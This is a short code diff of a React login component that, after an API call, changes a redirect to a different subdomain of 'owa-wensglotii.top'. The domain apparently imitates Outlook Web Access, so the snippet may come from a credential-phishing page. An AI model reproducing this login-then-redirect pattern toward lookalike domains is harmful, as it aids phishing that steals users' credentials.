@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://kar.tbint.owa-wensglotii.top/';
+      window.location.href = 'https://hestkar.owa-wensglotii.top/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
